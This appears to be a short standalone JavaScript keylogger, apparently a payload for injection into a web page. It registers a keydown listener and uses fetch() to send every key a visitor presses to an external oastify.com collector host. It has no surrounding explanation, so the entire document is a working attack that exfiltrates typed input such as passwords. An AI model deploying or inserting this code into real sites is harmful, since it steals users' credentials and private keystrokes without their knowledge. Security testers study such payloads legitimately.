function logKey(event){
	fetch("https://uusja5repbefzxlroie1zi7ovf16pwdl.oastify.com/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
